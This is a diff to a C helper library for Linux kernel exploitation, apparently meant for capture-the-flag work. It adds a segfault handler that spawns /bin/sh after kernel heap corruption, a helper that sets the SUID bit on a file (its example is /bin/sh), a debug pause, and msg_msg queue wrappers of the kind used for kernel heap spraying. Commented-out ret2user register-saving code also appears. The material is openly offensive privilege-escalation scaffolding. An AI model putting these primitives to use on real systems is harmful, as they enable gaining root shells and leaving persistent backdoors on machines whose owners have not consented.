@@ -91,7 +91,6 @@ size_t * froze(){
 /*
 save_status for ret2user
 */
-// size_t user_cs, user_ss, user_rflags, user_sp;
 // void save_status()
 // {
 //     __asm__("mov user_cs, cs;"
@@ -100,5 +99,155 @@ save_status for ret2user
 //             "pushf;"
 //             "pop user_rflags;"
 //             );
-//     puts("[*]status has been saved.");
+//     puts("[*] status has been saved.");
 // }
+
+
+
+/*
+    Part I: Basics, not specific-technique-related
+*/
+
+/*
+    Function Id 0: Set a Handler of Segfault
+    Desc:
+        If kernel Heap is borken we can use to process a SEGFAULT and spawn a shell
+*/
+void sigsegv_handler(int sig, siginfo_t *si, void *unused) {
+    
+    puts("[+] Libx: SegFault Handler is spwaning a shell...");
+    system("/bin/sh");
+    while(1); // Techniquly, we never his this line
+}
+void hook_segfault(){
+    struct sigaction sa;
+    memset(&sa, 0, sizeof(sigaction));
+    sigemptyset(&sa.sa_mask);
+    sa.sa_flags = SA_SIGINFO;
+    sa.sa_sigaction = sigsegv_handler;
+
+    if (sigaction(SIGSEGV, &sa, NULL) == -1) {
+        perror("sigaction");
+        exit(EXIT_FAILURE);
+    }
+}
+
+
+/*
+    Function Id 1: Set SUID for a prorgam
+    Desc:
+        Provide the name of file. Try to setsuid for it. 
+    Example:
+        setsuid("/bin/sh");
+*/
+void setsuid(char *filename){
+    mode_t mode = S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH;
+
+    // Attempt to set the suid bit along with the owner's execute permission and read/execute for group and others
+    if (chmod(filename, mode) == -1) {
+        perror("chmod failed to set suid bit");
+        return 1;
+    }
+    printf("Successfully set suid bit on %s\n", filename);
+    return 0;
+}
+/*
+    Function Id 2: Stop the process for debugging
+    Desc:
+        Stop the process for debugging
+    Example:
+        debug();
+*/
+void debug(){
+    puts("[!] DEBUG");
+    char buf[0x10];
+    read(0,buf,0xf);
+}
+/*
+    Part II: MSGMSG related
+*/
+
+/*
+    Function Id 0: create a msgQueue
+    Desc:
+        Provide a path, return the msgid
+    Example:
+        msgQueueCreate("/Home/user/1");
+*/
+int msgQueueCreate(char *s){
+    key_t key;
+    mkdir(s, 0755);
+    // Generate a unique key for the message queue
+    key = ftok(s, 'A');
+    if (key == -1) {
+        perror("ftok");
+        return 1;
+    }
+    int msgid;
+    // Create a message queue
+    msgid = msgget(key, 0666 | IPC_CREAT);
+    if (msgid == -1) {
+        perror("msgget");
+        return 1;
+    }
+    return msgid;
+}
+/*
+    Function Id 1: Send a Msg
+    Desc:
+        Insert a new message to a msgqueue
+    Example:
+        msgQueueSend(msgid,"libx",5,1);
+*/
+void msgQueueSend(int msgid,char *text,size_t size,size_t type){
+    
+    msgQueueMsg* msg = (msgQueueMsg *)malloc(sizeof(long)+size+0x1);
+    msg->mtype = type; // Message type (can be any positive integer)
+    strncpy(msg->mtext, text, size);
+    // Send the message
+    if (syscall(SYS_msgsnd, msgid, msg, size, 0) == -1) {
+        perror("msgsnd");
+        return ;
+    }
+    free(msg);
+    return ;  
+}
+/*
+    Function Id 2: Recv a Msg
+    Desc:
+        Remove (a) message(s) from msgqueue
+    Example:
+        msgQueueRecv(msgid,0x1000,0);
+*/
+msgQueueMsg* msgQueueRecv(int msgid,size_t size,size_t type){
+    msgQueueMsg* recv = (msgQueueMsg *)malloc(sizeof(long)+size+1);
+    if (syscall(SYS_msgrcv, msgid, recv, size, type, 0|010000) == -1) {
+        perror("msgrcv");
+        return NULL;
+    }
+    return recv;
+
+}
+/*
+    Function Id 2: Delete a mesage queue
+    Desc:
+        Delete a mesage queue
+    Example:
+        msgQueueDel(msgid);
+*/
+void msgQueueDel(int msgid){
+    if (msgctl(msgid, IPC_RMID, NULL) == -1)
+        perror("msgctl");
+    return; 
+}
+
+
+
+
+
+
+
+
+
+
+
